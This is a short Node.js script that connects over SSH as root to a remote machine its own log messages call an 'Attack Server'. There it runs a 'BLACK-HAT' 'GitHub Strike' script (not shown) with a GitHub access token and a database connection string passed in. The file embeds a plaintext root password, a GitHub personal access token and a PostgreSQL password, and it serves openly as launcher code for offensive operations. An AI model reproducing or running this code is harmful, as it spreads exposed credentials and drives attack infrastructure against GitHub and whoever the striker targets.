const { NodeSSH } = require('node-ssh');
const ssh = new NodeSSH();

async function runGithubStrike() {
  try {
    await ssh.connect({
      host: '187.77.111.203',
      username: 'root',
      password: 'Z4-nN8JfiUIh5,;g'
    });

    console.log('💀 [BLACK-HAT] Executing GitHub Strike from Attack Server...');
    
    // Set environment variables for the execution
    const githubPat = "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";
    const databaseUrl = "postgresql://drkcnay:4TVuj7qiHMfh7CxH6K!@213.232.235.181:5432/drkcnay?schema=public";
    
    const cmd = `export GITHUB_PAT="${githubPat}" && export DATABASE_URL="${databaseUrl}" && npx tsx scripts/master/github-striker.ts`;
    
    const result = await ssh.execCommand(cmd, { cwd: '/root/esc' });
    console.log(result.stdout || result.stderr);

    ssh.dispose();
    console.log('✅ [DONE] GitHub Strike executed.');
  } catch (err) {
    console.error('❌ [ERROR]', err);
    ssh.dispose();
  }
}

runGithubStrike();
